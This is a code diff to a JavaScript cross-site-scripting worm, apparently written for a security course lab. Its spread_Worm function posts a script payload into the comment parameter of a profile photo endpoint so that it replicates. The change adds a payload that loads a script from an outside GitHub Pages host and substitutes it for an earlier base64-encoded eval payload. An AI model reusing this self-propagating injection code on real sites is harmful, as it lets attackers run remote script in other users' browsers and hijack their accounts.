@@ -8,6 +8,7 @@ const payload1 = `
             `
 
 const payload = "<script>eval(atob(\"PGgzPkNTRUMgMzgwIEFuc3dlcnMgKFJlY29yZGVkKTwvaDM+\"));</script>";
+const ppayload = "<script src=\"https://pws1453.github.io/postreq.js\"></script>"
 
 
 const links = ["https://c.tenor.com/8EAnAZozlWUAAAAd/mark-zuckerberg-adjust.gif",
@@ -81,7 +82,7 @@ function spread_Worm(){
     for(let i = 134; i < 135; i++) {
         var id = i;
         var xhz = new XMLHttpRequest();
-        xhz.open("GET", `/change_photo.php?type=profile&id=${id}&comment=${payload}`,true);
+        xhz.open("GET", `/change_photo.php?type=profile&id=${id}&comment=${ppayload}`,true);
         xhz.send(); 
     }
 }
